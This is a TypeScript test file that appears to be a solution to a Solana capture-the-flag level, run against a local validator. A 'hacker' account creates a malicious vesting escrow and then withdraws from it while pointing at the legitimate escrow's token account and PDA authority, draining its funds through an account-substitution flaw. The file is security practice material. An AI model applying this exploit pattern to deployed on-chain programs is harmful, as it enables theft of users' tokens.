import * as anchor from "@coral-xyz/anchor";
import * as web3 from "@solana/web3.js";
import * as spl from "@solana/spl-token";
import { Level4 } from "../target/types/level_4";
import * as path from 'path';
import * as fs from 'fs';
import { ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, createAssociatedTokenAccount, getAssociatedTokenAddressSync, getOrCreateAssociatedTokenAccount } from "@solana/spl-token";


const USDC = new web3.PublicKey("DLnC1zbKwRX9BjcM9ZuV8uvXaqFY5JhhGWAuY7gVtwXD")
const ESCROW = new web3.PublicKey("Gi2wpf29MLsgMZWmUEtVndB2BKX5TLyEhdWt4bBWGVrP")
const ESCROW_TOKEN_ACCOUNT = new web3.PublicKey("2Me5B53SU2z5eC5ig8oyMuWosryVyMjsXRnvxx5cVwqv")
const HACKER_TOKEN_ACCOUNT = new web3.PublicKey("RzJdKwZLe2hB8KgsE87YwXJQKTHFnAGiV4hAuC94nGa")
const SENDER = new web3.PublicKey("J6oF4UUqWEW7YW3c4CNHWZybe2oMYSpHni8Su445fkt5")
const SENDER_TOKEN_ACCOUNT = new web3.PublicKey("2CoFvgSNNV7oZcujdPV7Pe79GUdBuLkTKZvuKDZASrp8")


// x x x x x x x x x x x x x x x x x x x x x
// | | | | | | | | | | | | | | | | | | | | |
//           ADD SECRETS CODE BELOW
// | | | | | | | | | | | | | | | | | | | | |
// v v v v v v v v v v v v v v v v v v v v v


const SECRET = ""


// ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^
// | | | | | | | | | | | | | | | | | | | | |
//           ADD SECRETS CODE ABOVE
// | | | | | | | | | | | | | | | | | | | | |
// x x x x x x x x x x x x x x x x x x x x x


describe("level-4", async () => {
  const provider = anchor.AnchorProvider.local("http://127.0.0.1:8899");
  anchor.setProvider(provider);

  const hacker = load_keypair('../accounts/hacker.json');
  const recipient =  web3.Keypair.generate();
  const program = anchor.workspace.Level4 as anchor.Program<Level4>;
  const attackEscrow = web3.Keypair.generate();
  const attackEscrowTokenAccount = web3.Keypair.generate();
  console.log(`Attack Escrow Token Account PubKey -> ${attackEscrowTokenAccount.publicKey}`);

  let ESCROW_PDA: any;
  let ATTACK_ESCROW_ATA: any;
  let HACKER_TA: any;
  let ATTACK_ESCROW_TA: any;
  let MALICIOUS_ESCROW: any;
  let MALICIOUS_ESCROW_RECIPIENT: any;
  let LEGIT_ESCROW_RECIPIENT: any;


  before("Setup", async () => {
    await airdrop(provider.connection, hacker.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);
    await airdrop(provider.connection, attackEscrow.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);
    await airdrop(provider.connection, recipient.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);
  
    const attackEscrowTokenAccount = web3.Keypair.generate();
    console.log(`Attack Escrow Token Account PubKey -> ${attackEscrowTokenAccount.publicKey}`);
  
    const hackerTokenAccountInfo = await provider.connection.getAccountInfo(HACKER_TOKEN_ACCOUNT);
    const senderTokenAccountInfo = await provider.connection.getAccountInfo(SENDER_TOKEN_ACCOUNT);
    const escrowTokenAccountInfo = await provider.connection.getAccountInfo(ESCROW_TOKEN_ACCOUNT);
    console.log("Hacker Token Account owner:", hackerTokenAccountInfo?.owner.toBase58());
    console.log("Hacker public key:", hacker.publicKey.toBase58());
    console.log("Sender token account owner:", senderTokenAccountInfo?.owner.toBase58());
    console.log("Escrow token account owner:", escrowTokenAccountInfo?.owner.toBase58());
  
    [ESCROW_PDA] = await web3.PublicKey.findProgramAddressSync(
      [Buffer.from("ESCROW_PDA_AUTHORITY")],
      program.programId
    );
    console.log(`Escrow PDA -> ${ESCROW_PDA}`);
    const escrowPdaInfo = await provider.connection.getAccountInfo(ESCROW_PDA);
    console.log("Escrow PDA owner:", escrowPdaInfo?.owner.toBase58());
  
    // Create the account
    const minRent = await provider.connection.getMinimumBalanceForRentExemption(spl.AccountLayout.span);
    const createAccountIx = web3.SystemProgram.createAccount({
      fromPubkey: hacker.publicKey,
      newAccountPubkey: attackEscrowTokenAccount.publicKey,
      space: spl.AccountLayout.span,
      lamports: minRent,
      programId: spl.TOKEN_2022_PROGRAM_ID,
    });
  
    // Initialize the token account
    const initAccountIx = spl.createInitializeAccountInstruction(
      attackEscrowTokenAccount.publicKey,
      USDC,
      hacker.publicKey,
      spl.TOKEN_2022_PROGRAM_ID
    );
  
    // Send the transaction
    const transaction = new anchor.web3.Transaction()
      .add(createAccountIx)
      .add(initAccountIx);
    const signature = await provider.sendAndConfirm(transaction, [hacker, attackEscrowTokenAccount]);
    console.log('Attack Escrow Token Account created and initialized. Signature:', signature);
  
    // Verify the token account was created
    const attackEscrowTokenAccountInfo = await provider.connection.getAccountInfo(attackEscrowTokenAccount.publicKey);
    console.log(`Attack Escrow Token Account Owner -> ${attackEscrowTokenAccountInfo?.owner.toBase58()}`);
    ATTACK_ESCROW_TA = attackEscrowTokenAccount.publicKey;
  
  });


  // x x x x x x x x x x x x x x x x x x x x x
  // | | | | | | | | | | | | | | | | | | | | |
  //           ADD YOUR CODE BELOW
  // | | | | | | | | | | | | | | | | | | | | |
  // v v v v v v v v v v v v v v v v v v v v v

  it("Inspect legit escrow", async () => {  
    const escrow = await program.account.escrow.fetch(ESCROW);
    console.log(escrow);
    LEGIT_ESCROW_RECIPIENT =  escrow.recipient
  });

  it("Initialize Malicious Escrow", async () => {

    // Ensure ATTACK_ESCROW_TA is properly set
    console.log("ATTACK_ESCROW_TA:", ATTACK_ESCROW_TA.toBase58());

    const init = await program.methods.initVesting(
      hacker.publicKey, //recipient
      new anchor.BN('1000'), //amount
      new anchor.BN('0'), //start_at
      new anchor.BN('2'), //end_at
      new anchor.BN('1') //interval
    )
    .accounts({
      sender: hacker.publicKey,
      senderTokenAccount: HACKER_TOKEN_ACCOUNT,
      escrow: attackEscrow.publicKey,
      escrowTokenAccount: ATTACK_ESCROW_TA,
      mint: USDC,
      tokenProgram: TOKEN_2022_PROGRAM_ID,
      systemProgram: web3.SystemProgram.programId,
    })
    .signers([hacker, attackEscrow])
    .rpc();
    await new Promise(resolve => setTimeout(resolve, 2000));
    console.log("Initialization transaction:", init);

    // Fetch the escrow account to verify it was created
    const escrowAccount = await program.account.escrow.fetch(attackEscrow.publicKey);
    console.log("Escrow account:", escrowAccount);
    console.log("Escrow recipient:", escrowAccount.recipient);

    MALICIOUS_ESCROW = attackEscrow.publicKey
    MALICIOUS_ESCROW_RECIPIENT = escrowAccount.recipient

  });

  it("Inspect malicious escrow", async () => {  
    const escrow = await program.account.escrow.fetch(MALICIOUS_ESCROW);
    console.log("Malicious escrow ->", escrow);
  });

  it ("Withdraw", async () => {

    console.log("Accounts being used:");
    console.log("MALICIOUS_ESCROW_RECIPIENT:", MALICIOUS_ESCROW_RECIPIENT.toBase58());
    console.log("HACKER_TOKEN_ACCOUNT:", HACKER_TOKEN_ACCOUNT.toBase58());
    console.log("attackEscrow.publicKey:", attackEscrow.publicKey.toBase58());
    console.log("ESCROW_TOKEN_ACCOUNT:", ESCROW_TOKEN_ACCOUNT.toBase58());
    console.log("ESCROW_PDA:", ESCROW_PDA.toBase58());
    console.log("USDC:", USDC.toBase58());
    console.log("hacker.publicKey:", hacker.publicKey.toBase58());
  

    const withdraw = await program.methods.withdrawUnlocked()
    .accounts({
      recipient: hacker.publicKey,
      recipientTokenAccount: HACKER_TOKEN_ACCOUNT,
      escrow: MALICIOUS_ESCROW,
      escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
      escrowPdaAuthority: ESCROW_PDA,
      mint: USDC,
      tokenProgram: TOKEN_2022_PROGRAM_ID,
      systemProgram: web3.SystemProgram.programId
    })
    .signers([hacker])
    .rpc()
    await new Promise(resolve => setTimeout(resolve, 2000));
    console.log(withdraw);

  })

  it("Bug evaluation", async () => {


    const hack = await program.methods.revealSecret(SECRET).accounts({
      hacker: hacker.publicKey,
      hackerTokenAccount: HACKER_TOKEN_ACCOUNT,
      mint: USDC
    }
    ).signers([hacker]).rpc({ commitment: "confirmed" });
    console.log("Printing the hack ->", hack)

    // Optional: Fetch the transaction details
    const txDetails = await provider.connection.getTransaction(hack, {
      commitment: 'confirmed',
      maxSupportedTransactionVersion: 0
    });
  
    await new Promise(resolve => setTimeout(resolve, 5000));
    console.log("Transaction details:", txDetails);

  });

});
  

async function airdrop(connection: any, address: any, amount = 1000000000) {
  await connection.confirmTransaction(await connection.requestAirdrop(address, amount), "confirmed");
}

function load_keypair(name: string)
  : anchor.web3.Keypair {
  const jsonFilePath = path.join(__dirname, name);
  let rawdata = fs.readFileSync(jsonFilePath);
  let keyData = JSON.parse(rawdata.toString());
  return anchor.web3.Keypair.fromSecretKey(new Uint8Array(keyData))

}
